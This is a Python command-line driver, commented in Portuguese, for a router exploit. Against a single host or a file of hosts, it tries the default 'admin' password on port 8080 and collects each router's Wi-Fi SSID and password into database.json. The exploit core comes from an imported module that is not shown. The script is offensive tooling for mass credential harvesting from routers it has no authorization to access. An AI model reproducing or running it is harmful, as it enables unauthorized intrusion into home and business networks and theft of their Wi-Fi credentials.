import sys
import json
from argparse import ArgumentParser

from main import ExploitExecution

parser = ArgumentParser()
parser.add_argument('-u', '--url', help='Host alvo para o qual sera usado no exploit')
parser.add_argument('-f', '--file', help='Arquivo com hosts')
parser.add_argument('-P', '--password',default="admin", help='Senha do router padrão é admin')
parser.add_argument('-p', '--port', default=8080, help='Porta remota para acesso ao router padrão é 8080')

def ReadFile(file):
    file = open(file, 'r')
    arr = file.read().splitlines()
    file.close()
    return arr

def WriteFile(file, data):
    file = open(file, 'w+')
    json.dump(data, file)
    file.close()

def Progress(url, ssid, security):
    res = 'Connected => [%s]: Found -> SSID: %s PASS: %s'%(url, ssid, security)
    return res

if __name__ == "__main__":
    args = parser.parse_args()
    if (len(sys.argv) < 5):
        parser.print_help()
        sys.exit(0)

    try:
        arr = []
        if(args.url):
            request = ExploitExecution(args.password, args.url , args.port)
            response = request._response
            if response:
                print(Progress(args.url, response['ssid'], response['security']))
                arr.append(response)

        if(args.file):
            ips = ReadFile(args.file)
            count = 1
            for ip in ips:
                request = ExploitExecution(args.password, ip, args.port)
                response = request._response
                if response:
                    print(Progress(ip, response['ssid'], response['security']))
                    arr.append(response)
                count += 1

        WriteFile('database.json', arr)
    except KeyboardInterrupt:
        print('Exploit parado pelo usuário')
        sys.exit(0)
    